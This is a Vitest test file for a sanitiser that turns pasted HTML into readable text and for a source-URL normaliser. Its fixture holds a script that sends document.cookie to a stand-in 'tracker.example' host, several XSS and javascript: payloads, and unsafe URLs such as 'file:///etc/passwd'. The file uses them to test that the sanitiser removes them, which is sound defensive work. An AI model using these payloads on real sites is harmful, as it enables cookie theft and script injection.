import { describe, expect, it } from 'vitest'
import {
  looksLikeMarkup,
  normalizeSourceUrl,
  pastedLimits,
  pastedOutline,
  pastedReadable,
  readableAtLimit,
  readablePastedText
} from './pasted'

const hostile = `<!doctype html><html><head><title>Hidden</title>
<style>body{background:url(https://tracker.example/bg.gif)}</style>
<script>fetch('https://tracker.example/steal?c='+document.cookie)</script></head>
<body onload="alert(1)">
<!--[if mso]><script>alert('mso')</script><![endif]-->
<img src="https://tracker.example/open.gif" width="1" height="1" alt="">
<h1>Spring <b>sale</b> &amp; more</h1>
<p>Fresh styles &mdash; 20% off.<br>Ends Sunday.</p>
<a href="javascript:alert(2)">Shop now</a>
<iframe src="https://evil.example"></iframe>
<svg onload="alert(3)"><script>alert(4)</script></svg>
<form action="https://evil.example"><input name="x"></form>
<p>&lt;script&gt;alert(5)&lt;/script&gt;</p>
<script>never closed`

describe('Pasted reference text extraction', () => {
  it('removes executable, styling, embedded and tracking content from hostile markup', () => {
    const text = readablePastedText(hostile)
    expect(text).toContain('Spring sale & more')
    expect(text).toContain('Fresh styles — 20% off.\nEnds Sunday.')
    expect(text).toContain('Shop now')
    for (const removed of [
      'fetch(',
      'document.cookie',
      'tracker.example',
      'evil.example',
      'alert(1)',
      'alert(3)',
      'alert(4)',
      'mso',
      'javascript:',
      'onload',
      'Hidden',
      'background',
      'never closed',
      '<img',
      '<iframe',
      '<form'
    ])
      expect(text).not.toContain(removed)
  })
  it('keeps entity-encoded markup only as visible literal text', () => {
    // Shown as words through React text nodes; never parsed as an element.
    expect(readablePastedText(hostile)).toContain('<script>alert(5)</script>')
  })
  it('leaves plain text unchanged apart from whitespace and invisible characters', () => {
    const rlo = String.fromCodePoint(0x202e)
    const zeroWidth = String.fromCodePoint(0x200b)
    const plain = `Hello ${rlo}friends${zeroWidth}\r\n\r\n\r\n\r\nSee you  soon\t!\r\n5 < 6 and 7 > 3`
    expect(looksLikeMarkup(plain)).toBe(false)
    expect(readablePastedText(plain)).toBe(
      'Hello friends\n\nSee you soon !\n5 < 6 and 7 > 3'
    )
  })
  it('drops invalid numeric entities and bounds the readable result', () => {
    expect(readablePastedText('<p>a&#0;b&#xD800;c&#x1F600;</p>')).toBe(
      'abc\u{1F600}'
    )
    expect(
      readablePastedText(`<p>${'x'.repeat(pastedLimits.readable + 50)}</p>`)
    ).toHaveLength(pastedLimits.readable)
    expect(readablePastedText('<img src="x"><style>p{}</style>')).toBe('')
  })
  it('reports when the readable preview is limited and never when it is complete', () => {
    const long = pastedReadable(`${'word '.repeat(pastedLimits.readable)}end`)
    expect(long.limited).toBe(true)
    expect(long.text).toHaveLength(pastedLimits.readable)
    expect(readableAtLimit(long.text)).toBe(true)
    const short = pastedReadable('<p>Short note</p>')
    expect(short).toEqual({ text: 'Short note', limited: false })
    expect(readableAtLimit(short.text)).toBe(false)
    const exact = pastedReadable('y'.repeat(pastedLimits.readable))
    expect(exact.limited).toBe(false)
  })
  it('never splits a surrogate pair at the preview bound', () => {
    const emoji = String.fromCodePoint(0x1f600)
    const ellipsis = String.fromCodePoint(0x2026)
    const loneSurrogate =
      /[\ud800-\udbff](?![\udc00-\udfff])|(?<![\ud800-\udbff])[\udc00-\udfff]/
    // Pair straddles the cut: its high half would be the last kept unit.
    const straddling = pastedReadable(
      `${'a'.repeat(pastedLimits.readable - 1)}${emoji}tail`
    )
    expect(straddling.limited).toBe(true)
    expect(straddling.text).toHaveLength(pastedLimits.readable)
    expect(straddling.text.endsWith(`a${ellipsis}`)).toBe(true)
    expect(loneSurrogate.test(straddling.text)).toBe(false)
    expect(readableAtLimit(straddling.text)).toBe(true)
    // Pair ends exactly at the cut: kept whole, then the rest is limited.
    const ending = pastedReadable(
      `${'a'.repeat(pastedLimits.readable - 2)}${emoji}tail`
    )
    expect(ending.limited).toBe(true)
    expect(ending.text.endsWith(emoji)).toBe(true)
    expect(ending.text).toHaveLength(pastedLimits.readable)
    // Exactly at the bound with nothing after it: complete and unchanged.
    const exact = `${'a'.repeat(pastedLimits.readable - 2)}${emoji}`
    expect(pastedReadable(exact)).toEqual({ text: exact, limited: false })
    // Short Unicode content is untouched.
    const short = `Hej ${emoji} café — naïve`
    expect(pastedReadable(short)).toEqual({ text: short, limited: false })
  })
  it('stays linear on unterminated tag floods at the maximum paste size', () => {
    for (const flood of [
      '<a'.repeat(pastedLimits.body / 2),
      '<p>' + '<b x="'.repeat(pastedLimits.body / 6),
      '<!--' + '<script'.repeat(pastedLimits.body / 8)
    ]) {
      const started = performance.now()
      pastedReadable(flood)
      expect(performance.now() - started).toBeLessThan(1000)
    }
  })
  it('derives a paragraph outline without claiming more structure', () => {
    expect(pastedOutline('')).toEqual([])
    expect(pastedOutline('One')).toEqual(['Opening'])
    expect(pastedOutline('One\n\nTwo')).toEqual(['Opening', 'Closing'])
    expect(pastedOutline('One\n\nTwo\n\n\nThree\n\nFour')).toEqual([
      'Opening',
      'Body',
      'Closing'
    ])
  })
})

describe('Source web address', () => {
  it('accepts only credential-free http(s) addresses and never other schemes', () => {
    expect(normalizeSourceUrl('')).toBe('')
    expect(normalizeSourceUrl('  https://Shop.Example/a?b=1  ')).toBe(
      'https://shop.example/a?b=1'
    )
    for (const unsafe of [
      'javascript:alert(1)',
      'data:text/html,<script>alert(1)</script>',
      'file:///etc/passwd',
      'ftp://files.example',
      'https://user:secret@shop.example',
      'not a url',
      `https://shop.example/${'a'.repeat(pastedLimits.url)}`
    ])
      expect(normalizeSourceUrl(unsafe)).toBeNull()
  })
})
